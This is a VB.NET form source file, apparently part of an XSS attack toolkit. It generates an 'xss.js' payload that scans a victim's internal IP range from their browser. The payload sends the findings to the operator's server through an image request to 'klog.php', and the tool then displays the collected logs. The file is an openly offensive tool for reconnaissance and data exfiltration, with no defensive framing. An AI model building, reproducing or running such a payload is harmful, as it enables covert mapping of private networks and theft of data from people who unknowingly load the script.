Imports System.Threading
Imports System.IO

Public Class xss_info_internal_network

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js")
       stream.WriteLine(code1.Text)
        stream.WriteLine("start_ip = '" & startip.Text & "'.split('.');")
        stream.WriteLine("end_ip = '" & endip.Text & "'.split('.');")
        stream.WriteLine(code2.Text)
        stream.WriteLine("new Image().src = 'http://" & xss_server.server_ip & "/klog.php?log='+rett;")
        stream.WriteLine(code3.Text)
        stream.Close()
        Button1.Enabled = False
        Timer1.Enabled = True
        MsgBox("Internal Network Scan takes a while, Please Wait", vbInformation)
        System.Threading.Thread.Sleep(4500)
        'IO.File.Delete("xss.js")

    End Sub

    Private Sub xss_info_internal_network_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("logs.txt")
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("logs.txt")
        Me.Close()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim line As String = ""
        Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\logs.txt")
        line = readfile.ReadToEnd()
        If Not line = "" Then
            WebBrowser1.ScriptErrorsSuppressed = True
            WebBrowser1.DocumentText = line
            Timer1.Enabled = False
        End If
        readfile.Close()
        readfile = Nothing
       
    End Sub
End Class